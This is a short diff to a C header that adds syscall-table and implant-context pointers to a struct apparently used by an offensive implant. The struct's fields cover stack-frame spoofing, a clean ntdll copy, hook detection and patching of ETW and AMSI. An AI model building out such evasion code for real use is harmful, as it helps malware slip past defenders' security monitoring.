@@ -129,6 +129,8 @@ typedef struct _MEMGUARD_STATE {
 typedef struct _EVASION_CONTEXT {
     FRAME_LIBRARY  frame_lib;       /* Library of valid stack frames      */
     PVOID          clean_ntdll;     /* Clean ntdll mapping pointer        */
+    SYSCALL_TABLE *syscall_table;   /* Pointer to the syscall table       */
+    IMPLANT_CONTEXT *implant_ctx;   /* Back-pointer to implant context    */
     CRC_TABLE      crc_table;       /* CRC baselines for hook detection   */
     BOOL           etw_patched;     /* ETW providers patched flag         */
     BOOL           amsi_patched;    /* AMSI patched flag                  */
